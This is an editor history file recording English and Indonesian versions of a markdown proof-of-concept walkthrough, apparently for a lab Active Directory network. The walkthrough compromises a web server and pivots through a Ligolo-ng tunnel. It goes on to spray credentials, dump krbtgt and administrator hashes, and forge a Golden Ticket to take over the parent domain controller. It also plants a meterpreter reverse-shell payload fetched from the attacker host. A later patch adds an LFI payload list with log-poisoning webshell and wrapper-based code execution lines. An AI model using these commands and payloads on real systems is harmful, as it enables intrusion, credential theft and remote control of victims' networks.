{
    "sourceFile": "projects/active-directory/POC (IDN).md",
    "activeCommit": 0,
    "commits": [
        {
            "activePatchIndex": 3,
            "patches": [
                {
                    "date": 1751430734816,
                    "content": "Index: \n===================================================================\n--- \n+++ \n"
                },
                {
                    "date": 1751430823950,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -1,15 +1,15 @@\n-## Full Documentation: Privilege Escalation and Pivoting in Active Directory (EN)\r\n+## Dokumentasi Lengkap Privilege Escalation dan Pivoting Active Directory (ID)\r\n \r\n-### 1. Network and Port Scanning with Nmap\r\n+### 1. Scan Jaringan dan Port dengan Nmap\r\n \r\n ```bash\r\n nmap -sV 192.168.80.10\r\n ```\r\n \r\n-Port 80 is open ‚Äî access the web server via browser.\r\n+Port 80 terbuka, akses web server melalui browser.\r\n \r\n-### 2. Web Vulnerability Enumeration\r\n+### 2. Mencari Celah di Web\r\n \r\n * **LFI**: `../../../etc/passwd`\r\n * **Directory Brute-force**:\r\n \r\n@@ -18,11 +18,11 @@\n feroxbuster -u http://192.168.80.10 -w /home/miquela/wordlist/medium.txt\r\n gobuster dir -u http://192.168.80.10 -w /home/miquela/wordlist/big.txt\r\n ```\r\n \r\n-Goal: find sensitive info such as admin credentials.\r\n+Tujuannya mencari info sensitif seperti credential admin.\r\n \r\n-### 3. Log into Web Server via SSH\r\n+### 3. Login ke Web Server via SSH\r\n \r\n ```bash\r\n ssh privilege@192.168.80.10\r\n ```\r\n@@ -36,9 +36,9 @@\n sudo -l\r\n sudo id\r\n ```\r\n \r\n-### 5. Check Network Info\r\n+### 5. Cek Informasi Jaringan\r\n \r\n ```bash\r\n ifconfig\r\n ip a\r\n@@ -46,28 +46,28 @@\n route -n\r\n netstat\r\n ```\r\n \r\n-### 6. Searching for Sensitive Files\r\n+### 6. Mencari File Sensitif\r\n \r\n ```bash\r\n-sudo grep -Rni \"free string\" / 2>/dev/null\r\n-grep -Ril \"free string\" / 2>/dev/null\r\n-find / -type f -iname \"free_string\" 2>/dev/null\r\n+sudo grep -Rni \"bebas saya\" / 2>/dev/null\r\n+grep -Ril \"bebas saya\" / 2>/dev/null\r\n+find / -type f -iname \"bebas_saya\" 2>/dev/null\r\n ```\r\n \r\n-Example: `places.sqlite`\r\n+Contoh menarik: `places.sqlite`\r\n \r\n ```bash\r\n cd ~/.mozilla/firefox/<profile-folder>\r\n sqlite3 places.sqlite\r\n .tables\r\n select * from moz_bookmarks;\r\n ```\r\n \r\n-Found link: `http://192.168.98.30/admin/index.php?user=john@child.warfare.corp&pass=User1@#$%6`\r\n+Menemukan link: `http://192.168.98.30/admin/index.php?user=john@child.warfare.corp&pass=User1@#$%6`\r\n \r\n-### 7. Set Up Tunnel Using Ligolo-ng\r\n+### 7. Setup Tunnel dengan Ligolo-ng\r\n \r\n **Attacker:**\r\n \r\n ```bash\r\n@@ -91,9 +91,9 @@\n listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444\r\n sudo ip route add 192.168.98.0/24 dev ligolo\r\n ```\r\n \r\n-### 8. Enumerate Internal Network\r\n+### 8. Enumerasi Internal Network\r\n \r\n ```bash\r\n nmap -sn 192.168.98.0/24\r\n ping 192.168.98.2\r\n@@ -103,41 +103,41 @@\n 192.168.98.30\r\n 192.168.98.120\r\n ```\r\n \r\n-### 9. Credential Spray with CME & LSA Dump\r\n+### 9. Spray SMB Credential & Dump LSA\r\n \r\n ```bash\r\n crackmapexec smb target.txt -u john -p 'User1@#$%6'\r\n crackmapexec smb 192.168.98.30 -u john -p 'User1@#$%6' --lsa\r\n ```\r\n \r\n-Repeat with other credentials:\r\n+Ulangi jika ditemukan credential baru:\r\n \r\n ```bash\r\n crackmapexec smb target.txt -u corpmngr -p 'User4&*&*'\r\n ```\r\n \r\n-### 10. Add to /etc/hosts\r\n+### 10. Tambah /etc/hosts\r\n \r\n ```bash\r\n 192.168.98.2 warfare.corp dc01.warfare.corp\r\n 192.168.98.120 child.warfare.corp cdc.child.warfare.corp\r\n ```\r\n \r\n-### 11. Dump krbtgt Hash\r\n+### 11. Dump Hash krbtgt\r\n \r\n ```bash\r\n secretsdump.py -debug child/corpmngr@192.168.98.120 -hashes :4cb3933610b827a281ec479031128cc6 -just-dc-user 'child\\krbtgt'\r\n ```\r\n \r\n-Or:\r\n+Atau:\r\n \r\n ```bash\r\n secretsdump.py -debug child/corpmngr:'User4&*&*'@cdc.child.warfare.corp -just-dc-user 'child\\krbtgt'\r\n ```\r\n \r\n-### 12. Get Domain SIDs\r\n+### 12. Ambil SID Domain\r\n \r\n ```bash\r\n lookupsid.py child/corpmngr:'User4&*&*'@child.warfare.corp\r\n lookupsid.py child/corpmngr:'User4&*&*'@warfare.corp\r\n@@ -152,69 +152,69 @@\n -extra-sid S-1-5-21-3375883379-808943238-3239386119-519 Administrator\r\n export KRB5CCNAME=Administrator.ccache\r\n ```\r\n \r\n-### 14. Time Synchronization\r\n+### 14. Sinkronisasi Waktu\r\n \r\n ```bash\r\n sudo apt install ntpsec-ntpdate -y\r\n sudo ntpdig -S 192.168.98.2\r\n ```\r\n \r\n-### 15. Request Service Ticket & Dump Hash\r\n+### 15. Minta Service Ticket dan Dump Admin Hash\r\n \r\n ```bash\r\n getST.py -spn 'CIFS/dc01.warfare.corp' -k -no-pass child.warfare.corp/Administrator\r\n export KRB5CCNAME=Administrator@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache\r\n secretsdump.py -k -no-pass dc01.warfare.corp -just-dc-user 'warfare\\Administrator'\r\n ```\r\n \r\n-### 16. Access Parent Domain Controller\r\n+### 16. Akses Domain Controller Parent\r\n \r\n ```bash\r\n psexec.py child.warfare.corp/Administrator@dc01.warfare.corp -k -no-pass -target-ip 192.168.98.2\r\n ```\r\n \r\n-Or using hash:\r\n+Atau dengan hash:\r\n \r\n ```bash\r\n psexec.py -debug 'warfare/Administrator@dc01.warfare.corp' -hashes aad3b435b51404eeaad3b435b51404ee:c20a43b71503528c05c57fcbff0c78e3\r\n ```\r\n \r\n ---\r\n \r\n-## Persistence Techniques\r\n+## Teknik Persisten\r\n \r\n ### Upload Payload\r\n \r\n ```bash\r\n msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.98.15 lport=1234 -f exe -o rev.exe\r\n ```\r\n \r\n-### On Pivot Machine\r\n+### Di Pivot Machine\r\n \r\n ```bash\r\n ssh privilege@192.168.80.10\r\n ./agent -connect 10.10.200.23:11601 -ignore-cert\r\n ```\r\n \r\n-### On Attacker:\r\n+### Di Attacker:\r\n \r\n ```bash\r\n ligolo-proxy -selfcert\r\n start\r\n listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4321\r\n ```\r\n \r\n-### Upload to Victim\r\n+### Upload di Victim\r\n \r\n ```powershell\r\n powershell\r\n Invoke-WebRequest http://192.168.98.15:1237/payloads.exe -OutFile C:\\Users\\corpmngr\\Downloads\\payloads.exe\r\n cd C:\\Users\\corpmngr\\Downloads\r\n ```\r\n \r\n-### Start Handler on Kali\r\n+### Handler di Kali\r\n \r\n ```bash\r\n msfconsole\r\n use exploit/multi/handler\r\n@@ -223,53 +223,53 @@\n set payload windows/x64/meterpreter/reverse_tcp\r\n run\r\n ```\r\n \r\n-### Execute Payload on Victim\r\n+### Jalankan Payload di Victim\r\n \r\n ```powershell\r\n .\\payloads.exe\r\n ```\r\n \r\n ---\r\n \r\n-### Lateral Movement & Privilege Escalation to Parent\r\n+### Lateral Movement dan Privilege Escalation Parent Domain\r\n \r\n-1. Extract credentials using `creds_all` (meterpreter / kiwi).\r\n-2. Get DC info:\r\n+1. Cek user dengan `creds_all` via meterpreter.\r\n+2. Cari DC info:\r\n \r\n ```powershell\r\n Get-ADDomainController -Server child.warfare.corp\r\n Get-ADForest\r\n ```\r\n \r\n-3. Get SID for child/parent:\r\n+3. Dapatkan SID parent/child:\r\n \r\n ```powershell\r\n Get-DomainSID -Domain child.warfare.corp\r\n Get-DomainSID -Domain warfare.corp\r\n ```\r\n \r\n-4. Golden Ticket using ticketer:\r\n+4. Gunakan ticketer.py:\r\n \r\n ```bash\r\n impacket-ticketer -aesKey <AESKEY> -domain child.warfare.corp -domain-sid <CHILD_SID> -extra-sid <PARENT_SID>-519 Administrator\r\n ```\r\n \r\n ---\r\n \r\n-### Required Tools to Upload to Victim:\r\n+### Tools yang Wajib Upload:\r\n \r\n * `agent`\r\n * `payload.exe`\r\n * `mimikatz.exe`\r\n * `PowerView.ps1`\r\n \r\n-Import PowerView:\r\n+Import PowerView di powershell victim:\r\n \r\n ```powershell\r\n Import-Module .\\PowerView.ps1\r\n ```\r\n \r\n ---\r\n \r\n-> This is the complete English version of the attack flow. The Indonesian version is available above.\r\n+\r\n"
                },
                {
                    "date": 1751431230296,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -9,9 +9,11 @@\n Port 80 terbuka, akses web server melalui browser.\r\n \r\n ### 2. Mencari Celah di Web\r\n \r\n-* **LFI**: `../../../etc/passwd`\r\n+* **LFI**:\r\n+\r\n+\r\n * **Directory Brute-force**:\r\n \r\n ```bash\r\n dirsearch -u http://192.168.80.10 -w /home/miquela/wordlist/big.txt\r\n@@ -269,7 +271,5 @@\n ```powershell\r\n Import-Module .\\PowerView.ps1\r\n ```\r\n \r\n----\r\n \r\n-\r\n"
                },
                {
                    "date": 1751431235975,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -11,9 +11,45 @@\n ### 2. Mencari Celah di Web\r\n \r\n * **LFI**:\r\n \r\n+```bash\r\n+# ‚úÖ Basic LFI Examples\r\n+curl \"http://target/index.php?page=../../../../etc/passwd\"\r\n+curl \"http://target/index.php?page=../../../../windows/win.ini\"\r\n+curl \"http://target/index.php?page=../../../../var/log/apache2/access.log\"\r\n \r\n+# üîê Bypass Filters\r\n+curl \"http://target/index.php?page=..%2f..%2f..%2fetc%2fpasswd\"          # URL encoded\r\n+curl \"http://target/index.php?page=..%252f..%252fetc%252fpasswd\"        # Double encoded\r\n+curl \"http://target/index.php?page=../../../../etc/passwd%00\"           # Null byte (old PHP)\r\n+\r\n+# üêö LFI to RCE via Log Poisoning\r\n+# Step 1: Inject PHP via User-Agent header (access.log poisoning)\r\n+curl -A \"<?php system(\\$_GET['cmd']); ?>\" \"http://target/\"\r\n+# Step 2: Include poisoned log to execute\r\n+curl \"http://target/index.php?page=../../../../var/log/apache2/access.log&cmd=id\"\r\n+\r\n+# üßë‚Äçüíª Session Hijacking via LFI\r\n+curl \"http://target/index.php?page=/var/lib/php/sessions/sess_abcd1234\"\r\n+\r\n+# ‚ò†Ô∏è File Upload + LFI to RCE\r\n+# Upload image with embedded PHP code, then include it\r\n+curl \"http://target/index.php?page=../../uploads/shell.jpg&cmd=id\"\r\n+\r\n+# üåÄ PHP Wrappers (if allow_url_include=On)\r\n+curl \"http://target/index.php?page=php://filter/convert.base64-encode/resource=index.php\"\r\n+curl \"http://target/index.php?page=data:text/plain,<?php system(\\$_GET['cmd']); ?>&cmd=id\"\r\n+\r\n+# üìÅ Target Files (Linux/Windows)\r\n+curl \"http://target/index.php?page=/etc/passwd\"\r\n+curl \"http://target/index.php?page=/etc/shadow\"\r\n+curl \"http://target/index.php?page=/etc/hostname\"\r\n+curl \"http://target/index.php?page=/home/user/.ssh/id_rsa\"\r\n+curl \"http://target/index.php?page=C:/Windows/win.ini\"\r\n+curl \"http://target/index.php?page=C:/Windows/System32/config/SAM\"\r\n+```\r\n+\r\n * **Directory Brute-force**:\r\n \r\n ```bash\r\n dirsearch -u http://192.168.80.10 -w /home/miquela/wordlist/big.txt\r\n"
                }
            ],
            "date": 1751430734816,
            "name": "Commit-0",
            "content": "## Full Documentation: Privilege Escalation and Pivoting in Active Directory (EN)\r\n\r\n### 1. Network and Port Scanning with Nmap\r\n\r\n```bash\r\nnmap -sV 192.168.80.10\r\n```\r\n\r\nPort 80 is open ‚Äî access the web server via browser.\r\n\r\n### 2. Web Vulnerability Enumeration\r\n\r\n* **LFI**: `../../../etc/passwd`\r\n* **Directory Brute-force**:\r\n\r\n```bash\r\ndirsearch -u http://192.168.80.10 -w /home/miquela/wordlist/big.txt\r\nferoxbuster -u http://192.168.80.10 -w /home/miquela/wordlist/medium.txt\r\ngobuster dir -u http://192.168.80.10 -w /home/miquela/wordlist/big.txt\r\n```\r\n\r\nGoal: find sensitive info such as admin credentials.\r\n\r\n### 3. Log into Web Server via SSH\r\n\r\n```bash\r\nssh privilege@192.168.80.10\r\n```\r\n\r\n### 4. Post-Access Enumeration\r\n\r\n```bash\r\nwhoami\r\nhostname\r\nid\r\nsudo -l\r\nsudo id\r\n```\r\n\r\n### 5. Check Network Info\r\n\r\n```bash\r\nifconfig\r\nip a\r\nip r\r\nroute -n\r\nnetstat\r\n```\r\n\r\n### 6. Searching for Sensitive Files\r\n\r\n```bash\r\nsudo grep -Rni \"free string\" / 2>/dev/null\r\ngrep -Ril \"free string\" / 2>/dev/null\r\nfind / -type f -iname \"free_string\" 2>/dev/null\r\n```\r\n\r\nExample: `places.sqlite`\r\n\r\n```bash\r\ncd ~/.mozilla/firefox/<profile-folder>\r\nsqlite3 places.sqlite\r\n.tables\r\nselect * from moz_bookmarks;\r\n```\r\n\r\nFound link: `http://192.168.98.30/admin/index.php?user=john@child.warfare.corp&pass=User1@#$%6`\r\n\r\n### 7. Set Up Tunnel Using Ligolo-ng\r\n\r\n**Attacker:**\r\n\r\n```bash\r\nsudo ip tuntap add user $USER mode tun ligolo\r\nsudo ip link set ligolo up\r\nligolo-proxy -selfcert\r\n```\r\n\r\n**Pivot Machine:**\r\n\r\n```bash\r\nwget http://10.10.200.23:8000/agent\r\nchmod +x agent\r\n./agent -connect 10.10.200.23:11601 -ignore-cert\r\n```\r\n\r\n**Attacker:**\r\n\r\n```bash\r\nstart\r\nlistener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444\r\nsudo ip route add 192.168.98.0/24 dev ligolo\r\n```\r\n\r\n### 8. Enumerate Internal Network\r\n\r\n```bash\r\nnmap -sn 192.168.98.0/24\r\nping 192.168.98.2\r\ncat target.txt\r\n192.168.98.2\r\n192.168.98.15\r\n192.168.98.30\r\n192.168.98.120\r\n```\r\n\r\n### 9. Credential Spray with CME & LSA Dump\r\n\r\n```bash\r\ncrackmapexec smb target.txt -u john -p 'User1@#$%6'\r\ncrackmapexec smb 192.168.98.30 -u john -p 'User1@#$%6' --lsa\r\n```\r\n\r\nRepeat with other credentials:\r\n\r\n```bash\r\ncrackmapexec smb target.txt -u corpmngr -p 'User4&*&*'\r\n```\r\n\r\n### 10. Add to /etc/hosts\r\n\r\n```bash\r\n192.168.98.2 warfare.corp dc01.warfare.corp\r\n192.168.98.120 child.warfare.corp cdc.child.warfare.corp\r\n```\r\n\r\n### 11. Dump krbtgt Hash\r\n\r\n```bash\r\nsecretsdump.py -debug child/corpmngr@192.168.98.120 -hashes :4cb3933610b827a281ec479031128cc6 -just-dc-user 'child\\krbtgt'\r\n```\r\n\r\nOr:\r\n\r\n```bash\r\nsecretsdump.py -debug child/corpmngr:'User4&*&*'@cdc.child.warfare.corp -just-dc-user 'child\\krbtgt'\r\n```\r\n\r\n### 12. Get Domain SIDs\r\n\r\n```bash\r\nlookupsid.py child/corpmngr:'User4&*&*'@child.warfare.corp\r\nlookupsid.py child/corpmngr:'User4&*&*'@warfare.corp\r\n```\r\n\r\n### 13. Golden Ticket Attack\r\n\r\n```bash\r\nimpacket-ticketer -aesKey ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 \\\r\n-domain child.warfare.corp \\\r\n-domain-sid S-1-5-21-3754860944-83624914-1883974761 \\\r\n-extra-sid S-1-5-21-3375883379-808943238-3239386119-519 Administrator\r\nexport KRB5CCNAME=Administrator.ccache\r\n```\r\n\r\n### 14. Time Synchronization\r\n\r\n```bash\r\nsudo apt install ntpsec-ntpdate -y\r\nsudo ntpdig -S 192.168.98.2\r\n```\r\n\r\n### 15. Request Service Ticket & Dump Hash\r\n\r\n```bash\r\ngetST.py -spn 'CIFS/dc01.warfare.corp' -k -no-pass child.warfare.corp/Administrator\r\nexport KRB5CCNAME=Administrator@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache\r\nsecretsdump.py -k -no-pass dc01.warfare.corp -just-dc-user 'warfare\\Administrator'\r\n```\r\n\r\n### 16. Access Parent Domain Controller\r\n\r\n```bash\r\npsexec.py child.warfare.corp/Administrator@dc01.warfare.corp -k -no-pass -target-ip 192.168.98.2\r\n```\r\n\r\nOr using hash:\r\n\r\n```bash\r\npsexec.py -debug 'warfare/Administrator@dc01.warfare.corp' -hashes aad3b435b51404eeaad3b435b51404ee:c20a43b71503528c05c57fcbff0c78e3\r\n```\r\n\r\n---\r\n\r\n## Persistence Techniques\r\n\r\n### Upload Payload\r\n\r\n```bash\r\nmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.98.15 lport=1234 -f exe -o rev.exe\r\n```\r\n\r\n### On Pivot Machine\r\n\r\n```bash\r\nssh privilege@192.168.80.10\r\n./agent -connect 10.10.200.23:11601 -ignore-cert\r\n```\r\n\r\n### On Attacker:\r\n\r\n```bash\r\nligolo-proxy -selfcert\r\nstart\r\nlistener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4321\r\n```\r\n\r\n### Upload to Victim\r\n\r\n```powershell\r\npowershell\r\nInvoke-WebRequest http://192.168.98.15:1237/payloads.exe -OutFile C:\\Users\\corpmngr\\Downloads\\payloads.exe\r\ncd C:\\Users\\corpmngr\\Downloads\r\n```\r\n\r\n### Start Handler on Kali\r\n\r\n```bash\r\nmsfconsole\r\nuse exploit/multi/handler\r\nset lhost 0.0.0.0\r\nset lport 4321\r\nset payload windows/x64/meterpreter/reverse_tcp\r\nrun\r\n```\r\n\r\n### Execute Payload on Victim\r\n\r\n```powershell\r\n.\\payloads.exe\r\n```\r\n\r\n---\r\n\r\n### Lateral Movement & Privilege Escalation to Parent\r\n\r\n1. Extract credentials using `creds_all` (meterpreter / kiwi).\r\n2. Get DC info:\r\n\r\n```powershell\r\nGet-ADDomainController -Server child.warfare.corp\r\nGet-ADForest\r\n```\r\n\r\n3. Get SID for child/parent:\r\n\r\n```powershell\r\nGet-DomainSID -Domain child.warfare.corp\r\nGet-DomainSID -Domain warfare.corp\r\n```\r\n\r\n4. Golden Ticket using ticketer:\r\n\r\n```bash\r\nimpacket-ticketer -aesKey <AESKEY> -domain child.warfare.corp -domain-sid <CHILD_SID> -extra-sid <PARENT_SID>-519 Administrator\r\n```\r\n\r\n---\r\n\r\n### Required Tools to Upload to Victim:\r\n\r\n* `agent`\r\n* `payload.exe`\r\n* `mimikatz.exe`\r\n* `PowerView.ps1`\r\n\r\nImport PowerView:\r\n\r\n```powershell\r\nImport-Module .\\PowerView.ps1\r\n```\r\n\r\n---\r\n\r\n> This is the complete English version of the attack flow. The Indonesian version is available above.\r\n"
        }
    ]
}